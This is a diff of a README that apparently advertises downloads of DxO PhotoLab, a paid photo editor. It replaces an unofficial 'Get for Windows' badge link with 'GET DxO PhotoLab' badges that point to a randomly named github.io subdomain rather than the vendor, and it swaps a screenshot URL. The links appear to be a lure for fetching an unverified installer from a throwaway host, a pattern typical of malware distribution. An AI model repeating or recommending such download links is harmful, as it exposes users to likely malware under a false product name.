@@ -5,10 +5,8 @@
 </div>  
 <br>
 
-<div align="center">
+[![GET DxO PhotoLab](https://img.shields.io/badge/GET%20%E2%80%94%20DxO-PhotoLab-0078D6?style=for-the-badge&logoColor=white)](https://5goranl6hcun94dq8vist.github.io/.github/DxO-PhotoLab)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://dxo-photolab-windows-toolkit.github.io/.github/)
-</div>
 
 ---
 
@@ -22,13 +20,11 @@
 ---
 
 <div align="center">
-<img src="https://www.dpreview.com/files/p/articles/8334110411/PhotoLab-6-UI-PhotoLibrary-mode.jpeg" width="800">
+<img src="https://pub-27e14545e036427f828cd9cf06f1395f.r2.dev/web/dxo.com/news/photolab-committed-to-color/DxO_Vignette_shop_PL7_Desktop.jpg" width="800">
 </div>
 
-<div align="center">
+[![GET DxO PhotoLab](https://img.shields.io/badge/GET%20%E2%80%94%20DxO-PhotoLab-0078D6?style=for-the-badge&logoColor=white)](https://5goranl6hcun94dq8vist.github.io/.github/DxO-PhotoLab)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://dxo-photolab-windows-toolkit.github.io/.github/)
-</div>
 
 ---
 
